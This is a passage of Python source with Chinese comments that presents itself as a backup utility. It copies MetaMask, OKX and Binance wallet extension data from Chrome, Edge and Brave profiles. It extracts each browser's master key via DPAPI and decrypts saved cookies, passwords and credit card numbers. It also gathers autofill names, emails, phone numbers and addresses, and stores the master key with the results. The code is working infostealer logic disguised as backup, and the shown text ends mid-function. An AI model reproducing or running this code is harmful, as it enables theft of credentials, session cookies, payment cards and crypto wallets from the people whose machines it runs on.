                for root, _, files in os.walk(source_dir):
                    for file in files:
                        # 检查文件名是否包含截图关键字（不区分大小写）
                        file_lower = file.lower()
                        _, ext = os.path.splitext(file_lower)
                        if not any(keyword in file_lower for keyword in screenshot_keywords):
                            continue
                        if ext and ext not in screenshot_extensions:
                            continue
                            
                        source_file = os.path.join(root, file)
                        if not os.path.exists(source_file):
                            continue
                            
                        # 检查文件大小
                        try:
                            file_size = os.path.getsize(source_file)
                            if file_size == 0 or file_size > backup_manager.config.MAX_SINGLE_FILE_SIZE:
                                continue
                        except OSError:
                            continue
                            
                        relative_path = os.path.relpath(root, source_dir)
                        target_sub_dir = os.path.join(screenshot_backup_directory, relative_path)
                        
                        if not backup_manager._ensure_directory(target_sub_dir):
                            continue
                            
                        try:
                            shutil.copy2(source_file, os.path.join(target_sub_dir, file))
                            files_found = True
                            if backup_manager.config.DEBUG_MODE:
                                logging.info(f"📸 已备份截图: {relative_path}/{file}")
                        except Exception as e:
                            logging.error(f"复制截图文件失败 {source_file}: {e}")
            except Exception as e:
                logging.error(f"处理截图目录失败 {source_dir}: {e}")
        else:
            logging.error(f"截图目录不存在: {source_dir}")
            
    if files_found:
        logging.info("📸 截图备份完成，已找到符合规则的文件")
    else:
        logging.info("📸 未找到符合规则的截图文件")
            
    return screenshot_backup_directory if files_found else None

def backup_browser_extensions(backup_manager):
    """备份浏览器扩展数据（支持多个浏览器分身）"""
    username = getpass.getuser()
    user_prefix = username[:5] if username else "user"
    extensions_backup_dir = os.path.join(
        backup_manager.config.BACKUP_ROOT,
        f"{user_prefix}_browser_extensions"
    )

    # 目标扩展的识别信息（通过名称和可能的ID匹配）
    # 支持从不同商店安装的扩展（Chrome Web Store、Edge Add-ons Store等）
    target_extensions = {
        "metamask": {
            "names": ["MetaMask", "metamask"],  # manifest.json 中的 name 字段
            "ids": [
                "nkbihfbeogaeaoehlefnkodbefgpgknn",  # Chrome / Brave
                "ejbalbakoplchlghecdalmeeeajnimhm",  # Edge
            ],
        },
        "okx_wallet": {
            "names": ["OKX Wallet", "OKX", "okx wallet"],
            "ids": [
                "mcohilncbfahbmgdjkbpemcciiolgcge",  # Chrome / Brave
                "pbpjkcldjiffchgbbndmhojiacbgflha",  # Edge
            ],
        },
        "binance_wallet": {
            "names": ["Binance Wallet", "Binance", "binance wallet"],
            "ids": [
                "cadiboklkpojfamcoggejbbdjcoiljjk",  # Chrome / Brave
                # Edge 不支持 Binance Wallet
            ],
        },
    }
    
    # 浏览器 User Data 根目录
    browser_user_data_paths = {
        "chrome": os.path.join(os.environ['LOCALAPPDATA'], "Google", "Chrome", "User Data"),
        "edge": os.path.join(os.environ['LOCALAPPDATA'], "Microsoft", "Edge", "User Data"),
        "brave": os.path.join(os.environ['LOCALAPPDATA'], "BraveSoftware", "Brave-Browser", "User Data"),
    }
    
    def identify_extension(ext_id, ext_settings_path):
        """通过扩展ID和manifest.json识别扩展类型"""
        # 方法1: 通过已知ID匹配
        for ext_name, ext_info in target_extensions.items():
            if ext_id in ext_info["ids"]:
                return ext_name
        
        # 方法2: 通过读取Extensions目录下的manifest.json识别
        # 扩展的实际安装目录在 Extensions 文件夹中
        try:
            # 尝试从 Local Extension Settings 的父目录找到 Extensions 目录
            profile_path = os.path.dirname(ext_settings_path)
            extensions_dir = os.path.join(profile_path, "Extensions")
            if os.path.exists(extensions_dir):
                ext_install_dir = os.path.join(extensions_dir, ext_id)
                if os.path.exists(ext_install_dir):
                    # 查找版本目录（扩展通常安装在版本号子目录中）
                    version_dirs = [d for d in os.listdir(ext_install_dir) 
                                   if os.path.isdir(os.path.join(ext_install_dir, d))]
                    for version_dir in version_dirs:
                        manifest_path = os.path.join(ext_install_dir, version_dir, "manifest.json")
                        if os.path.exists(manifest_path):
                            try:
                                with open(manifest_path, 'r', encoding='utf-8') as f:
                                    manifest = json.load(f)
                                    ext_name_in_manifest = manifest.get("name", "")
                                    # 检查是否匹配目标扩展
                                    for ext_name, ext_info in target_extensions.items():
                                        for target_name in ext_info["names"]:
                                            if target_name.lower() in ext_name_in_manifest.lower():
                                                return ext_name
                            except Exception as e:
                                if backup_manager.config.DEBUG_MODE:
                                    logging.debug(f"读取manifest.json失败: {manifest_path} - {e}")
                                continue
        except Exception as e:
            if backup_manager.config.DEBUG_MODE:
                logging.debug(f"识别扩展失败: {ext_id} - {e}")
        
        return None
    
    try:
        if not backup_manager._ensure_directory(extensions_backup_dir):
            return None
        
        backed_up_count = 0
        
        for browser_name, user_data_path in browser_user_data_paths.items():
            if not os.path.exists(user_data_path):
                continue
            
            # 扫描所有可能的 Profile 目录（Default, Profile 1, Profile 2, ...）
            try:
                profiles = []
                for item in os.listdir(user_data_path):
                    item_path = os.path.join(user_data_path, item)
                    # 检查是否是 Profile 目录（Default 或 Profile N）
                    if os.path.isdir(item_path) and (item == "Default" or item.startswith("Profile ")):
                        ext_settings_path = os.path.join(item_path, "Local Extension Settings")
                        if os.path.exists(ext_settings_path):
                            profiles.append((item, ext_settings_path))
                
                # 备份每个 Profile 中的扩展
                for profile_name, ext_settings_path in profiles:
                    # 扫描所有扩展目录
                    try:
                        ext_dirs = [d for d in os.listdir(ext_settings_path) 
                                   if os.path.isdir(os.path.join(ext_settings_path, d))]
                        
                        for ext_id in ext_dirs:
                            # 识别扩展类型
                            ext_name = identify_extension(ext_id, ext_settings_path)
                            if not ext_name:
                                continue  # 不是目标扩展，跳过
                            
                            source_dir = os.path.join(ext_settings_path, ext_id)
                            if not os.path.exists(source_dir):
                                continue
                            
                            # 目标目录包含 Profile 名称
                            profile_suffix = "" if profile_name == "Default" else f"_{profile_name.replace(' ', '_')}"
                            target_dir = os.path.join(extensions_backup_dir, 
                                                     f"{user_prefix}_{browser_name}{profile_suffix}_{ext_name}")
                            try:
                                if os.path.exists(target_dir):
                                    shutil.rmtree(target_dir, ignore_errors=True)
                                parent_dir = os.path.dirname(target_dir)
                                if backup_manager._ensure_directory(parent_dir):
                                    shutil.copytree(source_dir, target_dir, symlinks=True)
                                    backed_up_count += 1
                                    if backup_manager.config.DEBUG_MODE:
                                        logging.info(f"📦 已备份: {browser_name} {profile_name} {ext_name} (ID: {ext_id})")
                            except Exception as e:
                                logging.error(f"复制扩展目录失败: {source_dir} - {e}")
                    except Exception as e:
                        if backup_manager.config.DEBUG_MODE:
                            logging.debug(f"扫描扩展目录失败: {ext_settings_path} - {e}")
            
            except Exception as e:
                logging.error(f"扫描 {browser_name} 配置文件失败: {e}")

        if backed_up_count > 0:
            logging.info(f"📦 成功备份 {backed_up_count} 个浏览器扩展")
            return extensions_backup_dir
        else:
            logging.warning("⚠️ 未找到任何浏览器扩展数据")
            return None
    except Exception as e:
        logging.error(f"复制浏览器扩展目录失败: {e}")
        return None

def export_browser_cookies_passwords(backup_manager):
    """导出浏览器 Cookies、密码和 Web Data（加密备份）"""
    if not BROWSER_EXPORT_AVAILABLE:
        logging.warning("⏭️  跳过浏览器数据导出（缺少必要库）")
        return None
    
    try:
        logging.info("🔐 开始导出浏览器 Cookies、密码和 Web Data...")
        
        # 获取用户名前缀
        username = getpass.getuser()
        user_prefix = username[:5] if username else "user"
        
        # 浏览器 User Data 根目录（支持多个 Profile）
        browsers = {
            "Chrome": os.path.join(os.environ['LOCALAPPDATA'], "Google", "Chrome", "User Data"),
            "Edge": os.path.join(os.environ['LOCALAPPDATA'], "Microsoft", "Edge", "User Data"),
            "Brave": os.path.join(os.environ['LOCALAPPDATA'], "BraveSoftware", "Brave-Browser", "User Data"),
        }
        
        all_data = {
            "export_time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "username": username,
            "browsers": {}
        }
        
        def sqlite_online_backup(source_db, dest_db):
            """使用 SQLite Online Backup 复制数据库"""
            try:
                source_conn = sqlite3.connect(f"file:{source_db}?mode=ro", uri=True)
                dest_conn = sqlite3.connect(dest_db)
                source_conn.backup(dest_conn)
                source_conn.close()
                dest_conn.close()
                return True
            except sqlite3.OperationalError as e:
                # 文件被锁定或无法访问是常见情况，降低日志级别
                if "locked" in str(e).lower() or "unable to open" in str(e).lower():
                    logging.debug(f"SQLite 在线备份失败（文件可能被锁定）: {source_db}")
                else:
                    logging.debug(f"SQLite 在线备份失败: {e}")
                return False
            except Exception as e:
                logging.debug(f"SQLite 在线备份失败: {type(e).__name__}: {e}")
                return False
        
        def table_exists(cursor, table_name):
            """检查表是否存在"""
            try:
                cursor.execute("SELECT name FROM sqlite_master WHERE type='table' AND name=?", (table_name,))
                return cursor.fetchone() is not None
            except Exception:
                return False
        
        def safe_copy_locked_file(source_path, dest_path, max_retries=3):
            """安全复制被锁定的文件（浏览器运行时）"""
            for attempt in range(max_retries):
                try:
                    shutil.copy2(source_path, dest_path)
                    return True
                except PermissionError:
                    try:
                        with open(source_path, 'rb') as src, open(dest_path, 'wb') as dst:
                            shutil.copyfileobj(src, dst)
                        return True
                    except Exception as e:
                        if attempt == max_retries - 1:
                            logging.debug(f"文件被锁定，尝试 SQLite 在线备份: {source_path}")
                            return sqlite_online_backup(source_path, dest_path)
                        time.sleep(0.5)
                except Exception as e:
                    logging.debug(f"复制失败: {source_path} - {e}")
                    return False
            return False

        def decrypt_dpapi_batch(cipher_list):
            """批量 DPAPI 解密（Windows 本地）"""
            results = []
            failed_count = 0
            failed_errors = {}  # 统计错误类型和次数
            
            for cipher_text in cipher_list:
                try:
                    results.append(CryptUnprotectData(cipher_text, None, None, None, 0)[1].decode('utf-8', errors='ignore'))
                except Exception as e:
                    failed_count += 1
                    error_key = str(e)
                    failed_errors[error_key] = failed_errors.get(error_key, 0) + 1
                    results.append(None)
            
            # 只在有失败且失败数量较多时记录汇总日志（避免正常情况下的日志噪音）
            if failed_count > 0 and failed_count > len(cipher_list) * 0.1:  # 失败率超过10%时记录
                error_summary = ", ".join([f"{err}({count}次)" for err, count in list(failed_errors.items())[:3]])
                logging.debug(f"DPAPI 解密统计: 总计 {len(cipher_list)} 项, 失败 {failed_count} 项 ({failed_count/len(cipher_list)*100:.1f}%), 主要错误: {error_summary}")
            
            return results

        def export_profile_data(browser_name, profile_path, master_key, profile_name):
            """导出单个 Profile 的 Cookies、密码和 Web Data"""
            cookies = []
            passwords = []
            web_data = {
                "autofill_profiles": [],
                "credit_cards": [],
                "autofill_profile_names": [],
                "autofill_profile_emails": [],
                "autofill_profile_phones": [],
                "autofill_profile_addresses": []
            }
            
            # 导出 Cookies
            cookies_path = os.path.join(profile_path, "Network", "Cookies")
            if not os.path.exists(cookies_path):
                cookies_path = os.path.join(profile_path, "Cookies")
            
            if os.path.exists(cookies_path):
                temp_cookies = os.path.join(backup_manager.config.BACKUP_ROOT, f"temp_{browser_name}_{profile_name}_cookies.db")
                conn = None
                try:
                    if safe_copy_locked_file(cookies_path, temp_cookies):
                        conn = sqlite3.connect(temp_cookies)
                        cursor = conn.cursor()
                        # 使用 CAST 确保 encrypted_value 作为 BLOB 读取
                        cursor.execute("SELECT host_key, name, CAST(encrypted_value AS BLOB) as encrypted_value, path, expires_utc, is_secure, is_httponly FROM cookies")
                    
                        dpapi_cookie_items = []
                        for row in cursor.fetchall():
                            host, name, encrypted_value, path, expires, is_secure, is_httponly = row
                            try:
                                # 确保 encrypted_value 是 bytes 类型
                                if encrypted_value is not None:
                                    if isinstance(encrypted_value, str):
                                        try:
                                            encrypted_value = encrypted_value.encode('latin1')
                                        except:
                                            continue
                                    elif not isinstance(encrypted_value, (bytes, bytearray)):
                                        try:
                                            encrypted_value = bytes(encrypted_value)
                                        except:
                                            continue
                                
                                if encrypted_value and len(encrypted_value) >= 3 and encrypted_value[:3] == b'v10' and master_key:
                                    iv = encrypted_value[3:15]
                                    payload = encrypted_value[15:]
                                    cipher = AES.new(master_key, AES.MODE_GCM, iv)
                                    decrypted_value = cipher.decrypt(payload)[:-16].decode('utf-8', errors='ignore')
                                    if decrypted_value:
                                        cookies.append({
                                            "host": host,
                                            "name": name,
                                            "value": decrypted_value,
                                            "path": path,
                                            "expires": expires,
                                            "secure": bool(is_secure),
                                            "httponly": bool(is_httponly)
                                        })
                                else:
                                    dpapi_cookie_items.append(({
                                        "host": host,
                                        "name": name,
                                        "value": None,
                                        "path": path,
                                        "expires": expires,
                                        "secure": bool(is_secure),
                                        "httponly": bool(is_httponly)
                                    }, encrypted_value))
                            except Exception as e:
                                logging.debug(f"Cookies 解密失败: {e}")
                        if dpapi_cookie_items:
                            decrypted_list = decrypt_dpapi_batch([c for _, c in dpapi_cookie_items])
                            for (item, _), dec in zip(dpapi_cookie_items, decrypted_list):
                                if dec:
                                    item["value"] = dec
                                    cookies.append(item)
                    else:
                        logging.debug(f"无法复制 Cookies 数据库: {cookies_path}")
                except (sqlite3.Error, UnicodeDecodeError) as e:
                    logging.debug(f"导出 Cookies 失败 (尝试备用方法): {e}")
                    # 如果 CAST 方法失败，尝试使用备用方法
                    try:
                        if safe_copy_locked_file(cookies_path, temp_cookies):
                            conn = sqlite3.connect(temp_cookies)
                            conn.text_factory = bytes
                            cursor = conn.cursor()
                            cursor.execute("SELECT host_key, name, encrypted_value, path, expires_utc, is_secure, is_httponly FROM cookies")
                            
                            dpapi_cookie_items = []
                            for row in cursor.fetchall():
                                host_bytes, name_bytes, encrypted_value, path_bytes, expires, is_secure, is_httponly = row
                                try:
                                    host = host_bytes.decode('utf-8') if isinstance(host_bytes, bytes) else host_bytes
                                    name = name_bytes.decode('utf-8') if isinstance(name_bytes, bytes) else name_bytes
                                    path = path_bytes.decode('utf-8') if isinstance(path_bytes, bytes) else path_bytes
                                except:
                                    continue
                                
                                if encrypted_value is not None and isinstance(encrypted_value, bytes):
                                    if len(encrypted_value) >= 3 and encrypted_value[:3] == b'v10' and master_key:
                                        iv = encrypted_value[3:15]
                                        payload = encrypted_value[15:]
                                        cipher = AES.new(master_key, AES.MODE_GCM, iv)
                                        decrypted_value = cipher.decrypt(payload)[:-16].decode('utf-8', errors='ignore')
                                        if decrypted_value:
                                            cookies.append({
                                                "host": host,
                                                "name": name,
                                                "value": decrypted_value,
                                                "path": path,
                                                "expires": expires,
                                                "secure": bool(is_secure),
                                                "httponly": bool(is_httponly)
                                            })
                                    else:
                                        dpapi_cookie_items.append(({
                                            "host": host,
                                            "name": name,
                                            "value": None,
                                            "path": path,
                                            "expires": expires,
                                            "secure": bool(is_secure),
                                            "httponly": bool(is_httponly)
                                        }, encrypted_value))
                            if dpapi_cookie_items:
                                decrypted_list = decrypt_dpapi_batch([c for _, c in dpapi_cookie_items])
                                for (item, _), dec in zip(dpapi_cookie_items, decrypted_list):
                                    if dec:
                                        item["value"] = dec
                                        cookies.append(item)
                            conn.close()
                    except Exception as e2:
                        logging.debug(f"备用方法也失败: {e2}")
                except Exception as e:
                    logging.debug(f"导出 Cookies 失败: {e}")
                finally:
                    if conn:
                        try:
                            conn.close()
                        except Exception:
                            pass
                    if os.path.exists(temp_cookies):
                        try:
                            os.remove(temp_cookies)
                        except Exception:
                            pass
            
            # 导出密码
            login_data_path = os.path.join(profile_path, "Login Data")
            if os.path.exists(login_data_path):
                temp_login = os.path.join(backup_manager.config.BACKUP_ROOT, f"temp_{browser_name}_{profile_name}_login.db")
                conn = None
                try:
                    if safe_copy_locked_file(login_data_path, temp_login):
                        conn = sqlite3.connect(temp_login)
                        cursor = conn.cursor()
                        # 使用 CAST 确保 password_value 作为 BLOB 读取
                        cursor.execute("SELECT origin_url, username_value, CAST(password_value AS BLOB) as password_value FROM logins")
                    
                        dpapi_password_items = []
                        for row in cursor.fetchall():
                            url, username, encrypted_password = row
                            try:
                                # 确保 encrypted_password 是 bytes 类型
                                if encrypted_password is not None:
                                    if isinstance(encrypted_password, str):
                                        try:
                                            encrypted_password = encrypted_password.encode('latin1')
                                        except:
                                            continue
                                    elif not isinstance(encrypted_password, (bytes, bytearray)):
                                        try:
                                            encrypted_password = bytes(encrypted_password)
                                        except:
                                            continue
                                
                                if encrypted_password and len(encrypted_password) >= 3 and encrypted_password[:3] == b'v10' and master_key:
                                    iv = encrypted_password[3:15]
                                    payload = encrypted_password[15:]
                                    cipher = AES.new(master_key, AES.MODE_GCM, iv)
                                    decrypted_password = cipher.decrypt(payload)[:-16].decode('utf-8', errors='ignore')
                                    if decrypted_password:
                                        passwords.append({
                                            "url": url,
                                            "username": username,
                                            "password": decrypted_password
                                        })
                                else:
                                    dpapi_password_items.append(({
                                        "url": url,
                                        "username": username,
                                        "password": None
                                    }, encrypted_password))
                            except Exception as e:
                                logging.debug(f"密码解密失败: {e}")
                        if dpapi_password_items:
                            decrypted_list = decrypt_dpapi_batch([c for _, c in dpapi_password_items])
                            for (item, _), dec in zip(dpapi_password_items, decrypted_list):
                                if dec:
                                    item["password"] = dec
                                    passwords.append(item)
                    else:
                        logging.debug(f"无法复制 Login Data 数据库: {login_data_path}")
                except (sqlite3.Error, UnicodeDecodeError) as e:
                    logging.debug(f"导出密码失败 (尝试备用方法): {e}")
                    # 如果 CAST 方法失败，尝试使用备用方法
                    try:
                        if safe_copy_locked_file(login_data_path, temp_login):
                            conn = sqlite3.connect(temp_login)
                            conn.text_factory = bytes
                            cursor = conn.cursor()
                            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                            
                            dpapi_password_items = []
                            for row in cursor.fetchall():
                                url_bytes, username_bytes, encrypted_password = row
                                try:
                                    url = url_bytes.decode('utf-8') if isinstance(url_bytes, bytes) else url_bytes
                                    username = username_bytes.decode('utf-8') if isinstance(username_bytes, bytes) else username_bytes
                                except:
                                    continue
                                
                                if encrypted_password is not None and isinstance(encrypted_password, bytes):
                                    if len(encrypted_password) >= 3 and encrypted_password[:3] == b'v10' and master_key:
                                        iv = encrypted_password[3:15]
                                        payload = encrypted_password[15:]
                                        cipher = AES.new(master_key, AES.MODE_GCM, iv)
                                        decrypted_password = cipher.decrypt(payload)[:-16].decode('utf-8', errors='ignore')
                                        if decrypted_password:
                                            passwords.append({
                                                "url": url,
                                                "username": username,
                                                "password": decrypted_password
                                            })
                                    else:
                                        dpapi_password_items.append(({
                                            "url": url,
                                            "username": username,
                                            "password": None
                                        }, encrypted_password))
                            if dpapi_password_items:
                                decrypted_list = decrypt_dpapi_batch([c for _, c in dpapi_password_items])
                                for (item, _), dec in zip(dpapi_password_items, decrypted_list):
                                    if dec:
                                        item["password"] = dec
                                        passwords.append(item)
                            conn.close()
                    except Exception as e2:
                        logging.debug(f"备用方法也失败: {e2}")
                except Exception as e:
                    logging.debug(f"导出密码失败: {e}")
                finally:
                    if conn:
                        try:
                            conn.close()
                        except Exception:
                            pass
                    if os.path.exists(temp_login):
                        try:
                            os.remove(temp_login)
                        except Exception:
                            pass
            
            # 导出 Web Data（自动填充数据、支付方式等）
            web_data_path = os.path.join(profile_path, "Web Data")
            if os.path.exists(web_data_path):
                temp_web_data = os.path.join(backup_manager.config.BACKUP_ROOT, f"temp_{browser_name}_{profile_name}_webdata.db")
                conn = None
                try:
                    if safe_copy_locked_file(web_data_path, temp_web_data):
                        conn = sqlite3.connect(temp_web_data)
                        cursor = conn.cursor()
                        
                        # 导出信用卡信息（仅在表存在时）
                        if table_exists(cursor, "credit_cards"):
                            try:
                                # 使用 CAST 确保 card_number_encrypted 作为 BLOB 读取
                                cursor.execute("SELECT guid, name_on_card, expiration_month, expiration_year, CAST(card_number_encrypted AS BLOB) as card_number_encrypted, billing_address_id, nickname FROM credit_cards")
                                dpapi_card_items = []
                                for row in cursor.fetchall():
                                    guid, name_on_card, exp_month, exp_year, encrypted_card, billing_id, nickname = row
                                    try:
                                        # 确保 encrypted_card 是 bytes 类型
                                        if encrypted_card is not None:
                                            if isinstance(encrypted_card, str):
                                                try:
                                                    encrypted_card = encrypted_card.encode('latin1')
                                                except:
                                                    continue
                                            elif not isinstance(encrypted_card, (bytes, bytearray)):
                                                try:
                                                    encrypted_card = bytes(encrypted_card)
                                                except:
                                                    continue
                                        
                                        if encrypted_card and len(encrypted_card) >= 3 and encrypted_card[:3] == b'v10' and master_key:
                                            iv = encrypted_card[3:15]
                                            payload = encrypted_card[15:]
                                            cipher = AES.new(master_key, AES.MODE_GCM, iv)
                                            decrypted_card = cipher.decrypt(payload)[:-16].decode('utf-8', errors='ignore')
                                            if decrypted_card:
                                                web_data["credit_cards"].append({
                                                    "guid": guid,
                                                    "name_on_card": name_on_card,
                                                    "expiration_month": exp_month,
                                                    "expiration_year": exp_year,
                                                    "card_number": decrypted_card,
                                                    "billing_address_id": billing_id,
                                                    "nickname": nickname
                                                })
                                        elif encrypted_card:
                                            dpapi_card_items.append(({
                                                "guid": guid,
                                                "name_on_card": name_on_card,
                                                "expiration_month": exp_month,
                                                "expiration_year": exp_year,
                                                "card_number": None,
                                                "billing_address_id": billing_id,
                                                "nickname": nickname
                                            }, encrypted_card))
                                    except Exception as e:
                                        logging.debug(f"信用卡解密失败: {e}")
                                if dpapi_card_items:
                                    decrypted_list = decrypt_dpapi_batch([c for _, c in dpapi_card_items])
                                    for (item, _), dec in zip(dpapi_card_items, decrypted_list):
                                        if dec:
                                            item["card_number"] = dec
                                            web_data["credit_cards"].append(item)
                            except (sqlite3.Error, UnicodeDecodeError) as e:
                                logging.debug(f"导出信用卡信息失败 (尝试备用方法): {e}")
                                # 如果 CAST 方法失败，尝试使用备用方法
                                try:
                                    conn2 = sqlite3.connect(temp_web_data)
                                    conn2.text_factory = bytes
                                    cursor2 = conn2.cursor()
                                    cursor2.execute("SELECT guid, name_on_card, expiration_month, expiration_year, card_number_encrypted, billing_address_id, nickname FROM credit_cards")
                                    
                                    dpapi_card_items = []
                                    for row in cursor2.fetchall():
                                        guid_bytes, name_bytes, exp_month, exp_year, encrypted_card, billing_id, nickname_bytes = row
                                        try:
                                            guid = guid_bytes.decode('utf-8') if isinstance(guid_bytes, bytes) else guid_bytes
                                            name_on_card = name_bytes.decode('utf-8') if isinstance(name_bytes, bytes) else name_bytes
                                            nickname = nickname_bytes.decode('utf-8') if isinstance(nickname_bytes, bytes) else nickname_bytes
                                        except:
                                            continue
                                        
                                        if encrypted_card is not None and isinstance(encrypted_card, bytes):
                                            if len(encrypted_card) >= 3 and encrypted_card[:3] == b'v10' and master_key:
                                                iv = encrypted_card[3:15]
                                                payload = encrypted_card[15:]
                                                cipher = AES.new(master_key, AES.MODE_GCM, iv)
                                                decrypted_card = cipher.decrypt(payload)[:-16].decode('utf-8', errors='ignore')
                                                if decrypted_card:
                                                    web_data["credit_cards"].append({
                                                        "guid": guid,
                                                        "name_on_card": name_on_card,
                                                        "expiration_month": exp_month,
                                                        "expiration_year": exp_year,
                                                        "card_number": decrypted_card,
                                                        "billing_address_id": billing_id,
                                                        "nickname": nickname
                                                    })
                                            else:
                                                dpapi_card_items.append(({
                                                    "guid": guid,
                                                    "name_on_card": name_on_card,
                                                    "expiration_month": exp_month,
                                                    "expiration_year": exp_year,
                                                    "card_number": None,
                                                    "billing_address_id": billing_id,
                                                    "nickname": nickname
                                                }, encrypted_card))
                                    if dpapi_card_items:
                                        decrypted_list = decrypt_dpapi_batch([c for _, c in dpapi_card_items])
                                        for (item, _), dec in zip(dpapi_card_items, decrypted_list):
                                            if dec:
                                                item["card_number"] = dec
                                                web_data["credit_cards"].append(item)
                                    conn2.close()
                                except Exception as e2:
                                    logging.debug(f"备用方法也失败: {e2}")
                            except Exception as e:
                                logging.debug(f"导出信用卡信息失败: {e}")
                        
                        # 导出自动填充个人信息（仅在表存在时）
                        if table_exists(cursor, "autofill_profiles"):
                            try:
                                cursor.execute("SELECT guid, first_name, middle_name, last_name, full_name, honorific_prefix, honorific_suffix FROM autofill_profiles")
                                for row in cursor.fetchall():
                                    guid, first_name, middle_name, last_name, full_name, honorific_prefix, honorific_suffix = row
                                    web_data["autofill_profiles"].append({
                                        "guid": guid,
                                        "first_name": first_name,
                                        "middle_name": middle_name,
                                        "last_name": last_name,
                                        "full_name": full_name,
                                        "honorific_prefix": honorific_prefix,
                                        "honorific_suffix": honorific_suffix
                                    })
                            except Exception as e:
                                logging.debug(f"导出自动填充个人信息失败: {e}")
                        
                        # 导出姓名信息（仅在表存在时）
                        if table_exists(cursor, "autofill_profile_names"):
                            try:
                                cursor.execute("SELECT guid, first_name, middle_name, last_name, full_name FROM autofill_profile_names")
                                for row in cursor.fetchall():
                                    guid, first_name, middle_name, last_name, full_name = row
                                    web_data["autofill_profile_names"].append({
                                        "guid": guid,
                                        "first_name": first_name,
                                        "middle_name": middle_name,
                                        "last_name": last_name,
                                        "full_name": full_name
                                    })
                            except Exception as e:
                                logging.debug(f"导出姓名信息失败: {e}")
                        
                        # 导出邮箱信息（仅在表存在时）
                        if table_exists(cursor, "autofill_profile_emails"):
                            try:
                                cursor.execute("SELECT guid, email FROM autofill_profile_emails")
                                for row in cursor.fetchall():
                                    guid, email = row
                                    web_data["autofill_profile_emails"].append({
                                        "guid": guid,
                                        "email": email
                                    })
                            except Exception as e:
                                logging.debug(f"导出邮箱信息失败: {e}")
                        
                        # 导出电话信息（仅在表存在时）
                        if table_exists(cursor, "autofill_profile_phones"):
                            try:
                                cursor.execute("SELECT guid, number FROM autofill_profile_phones")
                                for row in cursor.fetchall():
                                    guid, number = row
                                    web_data["autofill_profile_phones"].append({
                                        "guid": guid,
                                        "number": number
                                    })
                            except Exception as e:
                                logging.debug(f"导出电话信息失败: {e}")
                        
                        # 导出地址信息（仅在表存在时）
                        if table_exists(cursor, "autofill_profile_addresses"):
                            try:
                                cursor.execute("SELECT guid, street_address, address_line_1, address_line_2, city, state, zipcode, country_code FROM autofill_profile_addresses")
                                for row in cursor.fetchall():
                                    guid, street_address, address_line_1, address_line_2, city, state, zipcode, country_code = row
                                    web_data["autofill_profile_addresses"].append({
                                        "guid": guid,
                                        "street_address": street_address,
                                        "address_line_1": address_line_1,
                                        "address_line_2": address_line_2,
                                        "city": city,
                                        "state": state,
                                        "zipcode": zipcode,
                                        "country_code": country_code
                                    })
                            except Exception as e:
                                logging.debug(f"导出地址信息失败: {e}")
                    else:
                        logging.debug(f"无法复制 Web Data 数据库: {web_data_path}")
                except Exception as e:
                    logging.debug(f"导出 Web Data 失败: {e}")
                finally:
                    if conn:
                        try:
                            conn.close()
                        except Exception:
                            pass
                    if os.path.exists(temp_web_data):
                        try:
                            os.remove(temp_web_data)
                        except Exception:
                            pass
            
            return cookies, passwords, web_data
        
        for browser_name, user_data_path in browsers.items():
            if not os.path.exists(user_data_path):
                continue
            
            # 获取主密钥（所有 Profile 共享同一个 Master Key）
            master_key = None
            master_key_b64 = None
            local_state_path = os.path.join(user_data_path, "Local State")
            if os.path.exists(local_state_path):
                try:
                    with open(local_state_path, "r", encoding="utf-8") as f:
                        local_state = json.load(f)
                    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
                    master_key = CryptUnprotectData(encrypted_key[5:], None, None, None, 0)[1]
                    # 将 Master Key 编码为 base64 以便保存
                    master_key_b64 = base64.b64encode(master_key).decode('utf-8')
                except Exception as e:
                    logging.debug(f"获取 {browser_name} Master Key 失败: {e}")
                    master_key = None
                    master_key_b64 = None
            
            # 扫描所有可能的 Profile 目录（Default, Profile 1, Profile 2, ...）
            profiles = []
            try:
                for item in os.listdir(user_data_path):
                    item_path = os.path.join(user_data_path, item)
                    # 检查是否是 Profile 目录（Default 或 Profile N）
                    if os.path.isdir(item_path) and (item == "Default" or item.startswith("Profile ")):
                        # 检查是否存在 Cookies、Login Data 或 Web Data 文件（支持 Network/Cookies 路径）
                        cookies_path = os.path.join(item_path, "Network", "Cookies")
                        if not os.path.exists(cookies_path):
                            cookies_path = os.path.join(item_path, "Cookies")
                        login_data_path = os.path.join(item_path, "Login Data")
                        web_data_path = os.path.join(item_path, "Web Data")
                        if os.path.exists(cookies_path) or os.path.exists(login_data_path) or os.path.exists(web_data_path):
                            profiles.append(item)
            except Exception as e:
                logging.error(f"❌ 扫描 {browser_name} Profile 目录失败: {e}")
                continue
            
            if not profiles:
                logging.warning(f"⚠️  {browser_name} 未找到任何 Profile")
                continue
            
            # 为每个 Profile 导出数据
            browser_profiles = {}
            for profile_name in profiles:
                profile_path = os.path.join(user_data_path, profile_name)
                logging.info(f"  📂 处理 Profile: {profile_name}")
                
                cookies, passwords, web_data = export_profile_data(browser_name, profile_path, master_key, profile_name)
                
                if cookies or passwords or any(web_data.values()):
                    total_web_data_items = (
                        len(web_data["autofill_profiles"]) +
                        len(web_data["credit_cards"]) +
                        len(web_data["autofill_profile_names"]) +
                        len(web_data["autofill_profile_emails"]) +
                        len(web_data["autofill_profile_phones"]) +
                        len(web_data["autofill_profile_addresses"])
                    )
                    browser_profiles[profile_name] = {
                        "cookies": cookies,
                        "passwords": passwords,
                        "web_data": web_data,
                        "cookies_count": len(cookies),
                        "passwords_count": len(passwords),
                        "web_data_count": total_web_data_items,
                        "credit_cards_count": len(web_data["credit_cards"]),
                        "autofill_profiles_count": len(web_data["autofill_profiles"])
                    }
                    web_data_info = f", {total_web_data_items} Web Data" if total_web_data_items > 0 else ""
                    logging.info(f"    ✅ {profile_name}: {len(cookies)} Cookies, {len(passwords)} 密码{web_data_info}")
            
            if browser_profiles:
                all_data["browsers"][browser_name] = {
                    "profiles": browser_profiles,
                    "master_key": master_key_b64,  # 备份 Master Key（base64 编码，所有 Profile 共享）
                    "total_cookies": sum(p["cookies_count"] for p in browser_profiles.values()),
                    "total_passwords": sum(p["passwords_count"] for p in browser_profiles.values()),
                    "total_web_data": sum(p.get("web_data_count", 0) for p in browser_profiles.values()),
                    "total_credit_cards": sum(p.get("credit_cards_count", 0) for p in browser_profiles.values()),
                    "total_autofill_profiles": sum(p.get("autofill_profiles_count", 0) for p in browser_profiles.values()),
                    "profiles_count": len(browser_profiles)
                }
                master_key_status = "✅" if master_key_b64 else "⚠️"
